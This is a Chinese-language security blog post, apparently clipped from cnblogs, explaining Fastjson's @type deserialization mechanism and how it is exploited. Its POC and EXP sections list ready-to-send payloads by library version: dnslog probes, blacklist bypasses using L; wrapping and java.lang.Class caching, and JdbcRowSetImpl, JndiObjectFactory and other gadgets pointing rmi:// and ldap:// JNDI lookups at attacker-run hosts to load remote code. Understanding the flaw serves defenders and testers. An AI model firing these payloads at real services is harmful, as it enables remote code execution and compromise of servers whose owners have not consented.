---
title: "【Fastjson】Fastjson反序列化由浅入深 - Aur0ra* - 博客园"
source: "https://www.cnblogs.com/Aurora-M/p/15683941.html"
author:
published:
created: 2025-03-19
description: "菜鸡一个，大师傅路过，如果不喜，勿喷 Fastjson真·简·介 fastjson是由alibaba开发并维护的一个json工具，以其特有的算法，号称最快的json库 fastjson的使用 首先先创一个简单的测试类User public class user { public"
tags:
  - "clippings"
---
> 菜鸡一个，大师傅路过，如果不喜，勿喷

## Fastjson真·简·介

fastjson是由alibaba开发并维护的一个json工具，以其特有的算法，号称最快的json库

## fastjson的使用

首先先创一个简单的测试类User

```java
public class user {
    public String username;
    public String password;

    public user(String username, String password) {
        this.username = username;
        this.password = password;
    }

    public String getUsername() {
        return username;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }
}
```

### 使用fastjson进行序列化和反序列化操作

```java
public class Fastjson {
    public static void main(String[] args) {
        user user = new user("Bob", "123.com");

        //序列化方式--指定类和不指定类
        String json1 = JSON.toJSONString(user);
        System.out.println(json1);//{"password":"123.com","username":"Aur0ra.sec"}
        String json2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(json2);//{"@type":"com.aur0ra.sec.fastjson.User","password":"123.com","username":"Aur0ra.sec"}

        //反序列化
        //默认解析为JSONObject
        System.out.println(JSON.parse(json1));      //{"password":"123.com","username":"Bob"}
        System.out.println(JSON.parse(json1).getClass().getName());    //com.alibaba.fastjson.JSONObject

        //依据序列化中的@type进行自动反序列化成目标对象类型
        System.out.println(JSON.parse(json2));      //com.aur0ra.sec.fastjson.user@24b1d79b
        System.out.println(JSON.parse(json2).getClass().getName()); //com.aur0ra.sec.fastjson.user

        //手动指定type，反序列化成目标对象类型
        System.out.println(JSON.parseObject(json1, user.class)); //com.aur0ra.sec.fastjson.user@68ceda24
        System.out.println(JSON.parseObject(json1, user.class).getClass().getName()); //com.aur0ra.sec.fastjson.user

    }
}
```

> 上述的序列化和反序列化操作，一定要手动实践。

执行后你会发现，使用JSON.toJSONString进行序列化时，可以设置是否将对象的类型也作为序列化的内容。当对字符串进行反序列化操作时，如果序列化字符串中有@type则会按照该类型进行反序列化操作，而如果没有该属性，则默认都返回JSONObject对象（一种字典类型数据存储)。当没有@type，但又想反序列化成指定的类对象时，需要通过JSON.parseObject()同时传入该类的class对象，才能反序列成指定的对象。  
注意:反序列化的对象必须具有默认的无参构造器和get|set方法，反序列化的底层实现就是通过无参构造器和get .set方法进行的

**漏洞点：由于序列化数据是从客户端发送的，如果将type属性修改成恶意的类型，再发送过去，而接收方进行正常的反序列化操作时，不就可以实现任意类的反序列化操作！！！**

## 原理探究

## 序列化

```java
...
public static final String toJSONString(Object object, SerializerFeature... features) {
        SerializeWriter out = new SerializeWriter();

        try {
            JSONSerializer serializer = new JSONSerializer(out);
            for (com.alibaba.fastjson.serializer.SerializerFeature feature : features) {
                serializer.config(feature, true);
            }

            serializer.write(object);

            return out.toString();
		}
}
...
```

当指定要将类的名字写入到序列化数据中时，就是将其写入到JSONSerializer的配置中，当执行写操作时，JSONSerializer会依据config，进行序列化操作。

## 手动指定类对象进行反序列化

[![](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211213153812912-728302730.png)](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211213153812912-728302730.png)

当手动指定类对象时，JSON会根据指定的Class进行加载和映射。

## 自动反序列化

> 跟了比较久，容易跟丢  
> [![](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211213153009964-1780718736.png)](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211213153009964-1780718736.png)

---

[![](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211213153034651-914984662.png)](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211213153034651-914984662.png)

第一张是调用图，第二张图是自动反序列化的关键点。在这里，首先就是会先进行词法分析（不知道的可以理解为按一定格式的将字符串分割），提取到字符串后，进行匹配，如果存在@type，那么就会进行如图中的动态加载对象，再完成后续操作，这也就是为什么可以实现自动类匹配加载。

## fastjson反序列化利用

> 上面的篇幅，相信应该讲清楚了，传入@type实现自动类匹配加载的原理。  
> 这里列举一些 fastjson 功能要点：

- 使用 JSON.parse(jsonString) 和 JSON.parseObject(jsonString, Target.class)，两者调用链一致，前者会在 jsonString 中解析字符串获取 @type 指定的类，后者则会直接使用参数中的class。
- fastjson 在创建一个类实例时会通过反射调用类中符合条件的 getter/setter 方法，其中 getter 方法需满足条件：方法名长于 4、不是静态方法、以 get 开头且第4位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法；setter 方法需满足条件：方法名长于 4，以 set 开头且第4位是大写字母、非静态方法、返回类型为 void 或当前类、参数个数为 1 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中。
- 使用 JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中的所有 getter 与setter 都被调用。
- 如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数。
- fastjson 在为类属性寻找 get/set 方法时，调用函数 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() 方法，会忽略 \_|- 字符串，也就是说哪怕你的字段名叫 *a\_g\_e*，getter 方法为 getAge()，fastjson 也可以找得到，在 1.2.36 版本及后续版本还可以支持同时使用 \_ 和 - 进行组合混淆。
- fastjson 在反序列化时，如果 Field 类型为 byte\[\]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码。

**上面也提到了，只要我们可以控制@type类就可以加载任意我们想要加载的类，从而实现漏洞利用**

## POC

	```java
// 目前最新版1.2.72版本可以使用1.2.36 < fastjson <= 1.2.72
     String payload = "{{\"@type\":\"java.net.URL\",\"val\"" +":\"http://9s1euv.dnslog.cn\"}:\"summer\"}";
     // 全版本支持 fastjson <= 1.2.72
     String payload1 = "{\"@type\":\"java.net.Inet4Address\",\"val\":\"zf7tbu.dnslog.cn\"}";
     String payload2 = "{\"@type\":\"java.net.Inet6Address\",\"val\":\"zf7tbu.dnslog.cn\"}";
```

在对渗透点判断是否存在fastjson反序列化时，可以利用dnslog进行漏洞验证

> 默认情况下，fastjson只对public属性进行反序列化操作，如果POC或则EXP中存在private属性时，需要服务端开启了SupportNonPublicField功能。

## EXP

> 需要开启autoType

### v1.2.25

 ```java
else if (className.charAt(0) == '[') {
	 Class<?> componentType = loadClass(className.substring(1), classLoader);
	 return Array.newInstance(componentType, 0).getClass();
 } else if (className.startsWith("L") && className.endsWith(";")) {
	 String newClassName = className.substring(1, className.length() - 1);
	 return loadClass(newClassName, classLoader);
```

也就是进行了校验后，又修改了数据进行加载，从而导致bypass。  
所以可以利用\[或者 L和;进行递归绕过

### v1.2.41

#### 漏洞简介：

fastjson判断类名是否以L开头、以;结尾，是的话就提取出其中的类名再加载。

#### exp

```java
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://x.x.x.x:1098/jndi", "autoCommit":true}\
```

### v1.2.42

1.2.42 版本新增了校验机制，如果输入类名的开头和结尾是l和;就将头和尾去掉，再进行黑名单验证。  
所以绕过需要在类名外部嵌套两层L;。

#### exp

```java
{
    "b":{
        "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
        "dataSourceName":"rmi://xx.x.xx.xx:9999/poc",
        "autoCommit":true
    }
}
```

---

> fastjson>=1.2.45 autoTypeSupport 属性默认为关闭

### fastjson = 1.2.45

#### 利用条件

> 1）、目标服务端存在mybatis的jar包。  
> 2）、版本需为 3.x.x ～ 3.5.0  
> 3）、autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）

#### exp

```java
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
```

### fastjson <= 1.2.47

#### 漏洞简介：

首先使用java.lang.CLass把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.JdbcRowSetlmpl这个类，绕过黑名单机制。

#### 利用条件

> ```undefined
> 小于 1.2.48 版本的通杀，autoType为关闭状态也可以。
> ```

loadClass中默认cache设置为true。

#### exp

```java
{
"a": {
          "@type": "java.lang.Class",
          "val": "com.sun.rowset.JdbcRowSetImpl"
      },
      "b": {
          "@type": "com.sun.rowset.JdbcRowSetImpl",
          "dataSourceName": "rmi://x.x.x.x:1098/jndi",
          "autoCommit": true
} }
```

### fastjson <= 1.2.62

黑名单绕过

```java
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
```

### fastjson <= 1.2.66

#### 利用条件：

autoTypeSupport属性为true才能使用。（fastjson >= 1.2.25默认为false）

#### 漏洞简介：

基于黑名单绕过。

#### exp

```java
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}

{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://x.x.x.x:1389/Calc"}

{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": 

{"@type":"java.util.Properties","UserTransacti
  on":"ldap://x.x.x.x:1389/Calc"}}
```

## 利用$ref实现fastjson的反序列化（2022/03/02 Appending）

fastjson支持[JsonPath](https://goessner.net/articles/JsonPath/ "JsonPath")

> JSONPath是为了在json中定位子元素的一种语言，具体语法规则网上较多，不做赘述。

```java
//反序列化代码：
...
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
String payload = "[{\"@type\":\"com.lxraa.serialize.fastjson.Test\",\"id\":123},{\"$ref\":\"$[0].id\"}]"; //引用数组第一个对象的id属性，会触发getId方法
Object o = JSON.parse(s);
...
```

基于反射，访问了指定对象的getid（）方法。

**直接定位getter，判断是否有触发恶意方法的可能，进行漏洞挖掘**

## ENDING

There is no system which has absolute SECURITY!  
U Know It,U Hack It!

Reference:[http://www.lmxspace.com/2019/06/29/FastJson-反序列化学习/](http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/)  
[https://paper.seebug.org/1613](https://paper.seebug.org/1613)

  

\_\_EOF\_\_

[![](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211207135309698-1468635161.png)](https://img2020.cnblogs.com/blog/2518338/202112/2518338-20211207135309698-1468635161.png)

- **本文作者：** [Aur0ra](https://www.cnblogs.com/Aurora-M)
- **本文链接：** [https://www.cnblogs.com/Aurora-M/p/15683941.html](https://www.cnblogs.com/Aurora-M/p/15683941.html)
- **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://msg.cnblogs.com/msg/send/Aurora-M)我。
- **版权声明：** 本博客所有文章除特别声明外，均采用 [BY-NC-SA](https://creativecommons.org/licenses/by-nc-nd/4.0/ "BY-NC-SA") 许可协议。转载请注明出处！
- **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](https://www.cnblogs.com/Aurora-M/p/)】**一下。

posted @   [Aur0ra\*](https://www.cnblogs.com/Aurora-M)  阅读(10050)  评论(0)  [编辑](https://i.cnblogs.com/EditPosts.aspx?postid=15683941)  [收藏](https://www.cnblogs.com/Aurora-M/p/)  [举报](https://www.cnblogs.com/Aurora-M/p/)

[升级成为园子VIP会员](https://cnblogs.vip/)

编辑 预览

56935e0b-d73d-42a8-63f6-08da5c229458

[不改了](https://www.cnblogs.com/Aurora-M/p/) [退出](https://www.cnblogs.com/Aurora-M/p/) [订阅评论](https://www.cnblogs.com/Aurora-M/p/ "订阅后有新评论时会邮件通知您")

\[Ctrl+Enter快捷键提交\]

[【推荐】100%开源！大型工业跨平台软件C++源码提供，建模，组态！](http://www.uccpsoft.com/index.htm)  
[【推荐】还在用 ECharts 开发大屏？试试这款永久免费的开源 BI 工具！](https://dataease.cn/?utm_source=cnblogs)  
[【推荐】国内首个AI IDE，深度理解中文开发场景，立即下载体验Trae](https://www.trae.com.cn/?utm_source=juejin&utm_medium=juejin_trae&utm_campaign=bokeyuan)  
[【推荐】编程新体验，更懂你的AI，立即体验豆包MarsCode编程助手](https://www.marscode.cn/?utm_source=advertising&utm_medium=cnblogs.com_ug_cpa&utm_term=hw_marscode_cnblogs&utm_content=home)  
[【推荐】抖音旗下AI助手豆包，你的智能百科全书，全免费不限次数](https://www.doubao.com/?channel=cnblogs&source=hw_db_cnblogs)  
[【推荐】轻量又高性能的 SSH 工具 IShell：AI 加持，快人一步](http://ishell.cc/)  

[![](https://img2024.cnblogs.com/blog/35695/202503/35695-20250303221234470-1278783675.jpg)](https://juejin.cn/coding-contest?utm_source=juejin&utm_medium=juejin_trae&utm_campaign=bokeyuan)

**编辑推荐：**  
· [分享一个我遇到过的“量子力学”级别的BUG。](https://www.cnblogs.com/thisiswhy/p/18777464)  
· [Linux系列：如何调试 malloc 的底层源码](https://www.cnblogs.com/huangxincheng/p/18750484)  
· [AI与.NET技术实操系列：基于图像分类模型对图像进行分类](https://www.cnblogs.com/code-daily/p/18764803)  
· [go语言实现终端里的倒计时](https://www.cnblogs.com/apocelipes/p/18753961)  
· [如何编写易于单元测试的代码](https://www.cnblogs.com/CareySon/p/18762884/how_to_write_testable_code)  

**阅读排行：**  
· [历时 8 年，我冲上开源榜前 8 了！](https://www.cnblogs.com/yupi/p/18778651)  
· [分享一个我遇到过的“量子力学”级别的BUG。](https://www.cnblogs.com/thisiswhy/p/18777464)  
· [物流快递公司核心技术能力-海量大数据处理技术](https://www.cnblogs.com/jirigala/p/18778511)  
· [四大AI编程工具组合测评](https://www.cnblogs.com/xh2023/p/18743549)  
· [关于能否用DeepSeek做危险的事情，DeepSeek本身给出了答案](https://www.cnblogs.com/nerd/p/18778483)  

点击右上角即可分享

![微信分享提示](https://img2023.cnblogs.com/blog/35695/202309/35695-20230906145857937-1471873834.gif)